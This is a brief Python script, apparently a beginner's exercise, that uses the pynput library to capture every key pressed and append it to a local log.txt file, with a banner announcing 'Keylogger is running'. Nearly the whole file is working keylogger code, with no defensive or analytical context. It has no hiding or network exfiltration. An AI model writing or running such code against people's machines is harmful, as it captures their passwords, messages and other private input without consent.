from pynput.keyboard import Listener

#this is the function that will be logging the keystrokes

def log_keystroke(key):
    key = str(key).replace("'", "") #this line is just to clean up the key format
    with open("log.txt", "a") as log_file:
        log_file.write(key + "\n") #this line writes the key to the log file


#this function will be used to start listening to keystrokes

def start_logging():
    with Listener(on_press=log_keystroke) as listener:
        listener.join() #this line will keep the listener running until the program is stopped


if __name__ == "__main__":
    print("Keylogger is runnning... (Press Ctrl+C to stop)")
    start_logging()
